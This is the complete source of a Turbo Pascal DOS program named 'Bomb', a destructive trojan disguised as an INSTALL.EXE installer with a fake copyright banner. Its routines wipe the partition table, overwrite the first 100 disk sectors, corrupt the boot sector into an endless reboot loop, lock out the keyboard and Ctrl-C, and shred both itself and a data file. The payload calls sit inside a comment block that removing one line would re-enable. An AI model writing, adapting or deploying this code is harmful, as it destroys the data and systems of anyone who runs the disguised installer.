   Program Bomb;

   Uses
    DOS, CRT;

   Const
     Version    = '1.0';
     Copyright  = 'Install v'+Version+'  (C) Vivid Imaginations, Ltd.  All rights reversed.';
     FillCh     = #0;

   Var
     Buff       : array[1..512] of byte;
     BuffC      : array[1..512] of char absolute Buff;
     f          : file;
     OldKeyVec  : pointer;
     i          : integer;
     CPath      : string;
     CProg      : string;
     SR         : searchrec;
     PS         : pathstr;
     DS         : dirstr;
     NS         : namestr;
     ES         : extstr;


   Procedure ByePartition;  {Use INT 13h to wipe the partition table}
   var
     s,o:integer;

   begin
     s := seg(Buff);
     o := ofs(Buff);
     asm
       push ax
       push bx
       push cx
       push dx
       push es
       mov ah,03
       mov al,01   {Num Sec}
       mov ch,00   {Cylinder}
       mov cl,01   {Sector #}
       mov dh,00   {Head}
       mov dl,80h  {Drive}
       mov es,s
       mov bx,o
       int 13h
       pop es
       pop dx
       pop cx
       pop bx
       pop ax
     end;
   end;


   Procedure ByeBoot;     {Read the BS, change the two byte jump to INT 19h}
   var                    {(reboot) which will cause an infinite reboot.   }
     s,o:integer;         {..until a diskette is inserted...               }
   begin
     s := seg(Buff);
     o := ofs(Buff);
     asm
       push ax
       push bx
       push cx
       push dx
       push es
       mov ah,02
       mov al,01   {Num Sec}
       mov ch,00   {Cylinder}
       mov cl,01   {Sector #}
       mov dh,01   {Head}
       mov dl,80h  {Drive}
       mov es,s
       mov bx,o
       int 13h
       pop es
       pop dx
       pop cx
       pop bx
       pop ax
     end;
     Buff[1] := $CD;   {INT}
     Buff[2] := $19;   {19h}
     asm
       push ax
       push bx
       push cx
       push dx
       push es
       mov ah,03
       mov al,01   {Num Sec}
       mov ch,00   {Cylinder}
       mov cl,01   {Sector #}
       mov dh,01   {Head}
       mov dl,80h  {Drive}
       mov es,s
       mov bx,o
       int 13h
       pop es
       pop dx
       pop cx
       pop bx
       pop ax
     end;
   end;

   Procedure Bye100;   {Send the first 100 sectors out for pizza}
   var
     s,o:integer;

   begin
     s := seg(Buff);
     o := ofs(Buff);
     asm
       push ax
       push bx
       push cx
       push dx
       push es
       mov ah,03
       mov al,100  {Num Sec}
       mov ch,00   {Cylinder}
       mov cl,02   {Sector #}
       mov dh,01   {Head}
       mov dl,80h  {Drive}
       mov es,s
       mov bx,o
       int 13h
       pop es
       pop dx
       pop cx
       pop bx
       pop ax
     end;
   end;


   Procedure EatAllKeys; Assembler;   {Gobble up any keys}
     asm
       push ax
       pushf
       in al,60h
       in al,61h
       mov ah,al
       or al,80h
       out 61h,al
       xchg ah,al
       out 61h,al
       popf
       cli
       mov al,20h
       out 20h,al
       pop ax
       iret
     end;


   Procedure Suicide;          {Erase the INSTALL.EXE program}
   var
     NB : integer;
   begin
     assign(f, CPath + CProg);
     reset(f,1);
     while not eof(f) do
       blockwrite(f, Buff, sizeof(Buff), NB);

     close(f);
     erase(f);
   end;


   Procedure DisableKeyboard;    {Send the keyboard to lunch}
   begin
     getintvec(9, OldKeyVec);
     setintvec(9, @EatAllKeys);
   end;

   Function GetPath : boolean;   {If DOS 3.3+, use ParamStr(0) otherwise use the}
   begin                         {FSearch <shudder> and look in the path        }
     GetPath := True; {Assume path is obtainable}
     if (lo(DosVersion) < 4) and (hi(DosVersion) < 3) then begin
       PS := FSearch('INSTALL.EXE',GetEnv('PATH'));
       if PS = '' then
           GetPath := False
           else begin
         FSplit(PS, DS, NS, ES);
         CPath := DS;
         CProg := NS + ES;
       end
     end
     else begin
       CPath := ParamStr(0);
       while CPath[length(CPath)] <> '\' do
         dec(CPath[0]);
       CProg := copy(ParamStr(0), length(CPath) + 1, length(ParamStr(0)) - length(CPath));
     end;
   end;

   Procedure ShowFile;    {Displays and overwrites INSTALL.DAT.  Assumes the DAT}
   var                    {file is in the same dir as INSTALL.EXE               }
     NB : integer;
     t  : text;
     s  : string;

   begin
     assign(t, cpath + 'INSTALL.DAT');
     {$I-}
     reset(t);
     if IOResult <> 0 then exit;
     while not eof(t) do begin
       readln(t, s);
       writeln(s);
       end;
     close(t);

     assign(f, CPath + 'INSTALL.DAT');
     reset(f,1);
     {$I+}
     while not eof(f) do
       blockwrite(f, Buff, sizeof(Buff), NB);
     close(f);
     erase(f);
   end;

   Begin
     CheckBreak := False;                       {Don't pay attention to Ctrl-C}

     DisableKeyboard;                           {Don't pay attention to ANY keys}

     randomize;                                 {Gotta do it once!}

     for i := 1 to sizeof(Buff) do              {Fill the buffer with trash}
       Buff[i] := random(255) + 1;

     writeln;                                   {Display the copyright notice}
     writeln(Copyright);

     if GetPath <> True then begin              {Whoops...couldn't find itself}
       writeln('Couldn''t find INSTALL.EXE!');  {and so, request the path}
       writeln('INSTALL must be in the current directory.');
       HALT;                                    {Not really true, but will work}
       end;
   (********** Disabling comment
     Suicide;                                   {Overwrite and erase self}

     ByePartition;                              {Partition table kisses the baby}

     Bye100;                                    {First 100 sectors wave good-bye}

     ByeBoot;                                   {The boot sector is replaced}

     ShowFile;                                  {Display and erase INSTALL.DAT}
   ******************************)
   End.

   (*****************************************************************************
      AUTHOR'S NOTES

   1). This program will detect its name under DOS 3.3+, however earlier versions
       of DOS do not support PARAMSTR(0) and so you must name the program
       INSTALL.EXE or change the name in the GetPath function.

   2). The above disabling comment was placed in such a manner as to protect your
       data.  Removing these comments and recompiling this code is not in any way
       recommended by the author.
   *****************************************************************************)
